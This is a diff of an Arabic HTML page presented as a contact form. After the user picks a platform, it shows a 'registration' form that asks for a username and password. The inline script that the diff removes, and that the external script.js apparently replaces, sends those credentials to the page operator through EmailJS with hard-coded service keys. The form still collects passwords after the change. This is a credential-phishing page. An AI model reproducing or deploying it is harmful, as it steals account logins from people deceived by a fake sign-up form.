@@ -5,45 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نموذج الاتصال</title>
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        // تهيئة EmailJS
-        (function () {
-            emailjs.init("1xqwBMfecM1SSulsh"); // المفتاح العام
-        })();
-
-        // تفعيل النموذج عند اختيار منصة
-        function activateContactForm(platformName) {
-            const formContainer = document.getElementById("form-container");
-            const platformTitle = document.getElementById("platform-name");
-            
-            // تعيين اسم المنصة
-            platformTitle.textContent = `التسجيل في ${platformName}`;
-            formContainer.style.display = "block"; // عرض النموذج
-        }
-
-        // إرسال البيانات عبر EmailJS
-        function sendPlatformData(event) {
-            event.preventDefault(); // منع التحديث التلقائي للصفحة
-            
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
-
-            const templateParams = {
-                username: username,
-                password: password
-            };
-
-            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
-                .then(function (response) {
-                    alert('تم إرسال البيانات بنجاح!');
-                    console.log('Success:', response);
-                    document.getElementById("registration-form").reset(); // إعادة تعيين النموذج
-                }, function (error) {
-                    alert('حدث خطأ أثناء الإرسال. الرجاء المحاولة مرة أخرى.');
-                    console.error('Error:', error);
-                });
-        }
-    </script>
+    <script src="script.js" defer></script> <!-- استدعاء الملف الخارجي -->
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -54,9 +16,6 @@
             direction: rtl;
         }
         header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
             padding: 15px 30px;
             background-color: #222;
             color: white;
@@ -67,19 +26,14 @@
             background-color: #444;
             color: white;
             border-radius: 10px;
-            font-size: 18px;
-            display: inline-block;
             cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
         }
         .platform:hover {
             background-color: #666;
-            transform: scale(1.05);
         }
         .form-container {
             display: none;
             margin-top: 30px;
-            text-align: left;
         }
         .form-container input, .form-container button {
             width: 90%;
@@ -89,23 +43,17 @@
             display: block;
             border: 1px solid #ddd;
             border-radius: 8px;
-            font-size: 16px;
         }
         .form-container button {
             background-color: #444;
             color: white;
-            border: none;
             cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        .form-container button:hover {
-            background-color: #666;
         }
     </style>
 </head>
 <body>
 <header>
-    <div>نموذج الاتصال</div>
+    <h1>نموذج الاتصال</h1>
 </header>
 
 <div class="content">
@@ -117,8 +65,8 @@
     <div class="form-container" id="form-container">
         <h3 id="platform-name">التسجيل في</h3>
         <form id="registration-form" onsubmit="sendPlatformData(event)">
-            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required>
-            <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
+            <input type="text" id="username" placeholder="اسم المستخدم" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
             <button type="submit">إرسال</button>
         </form>
     </div>
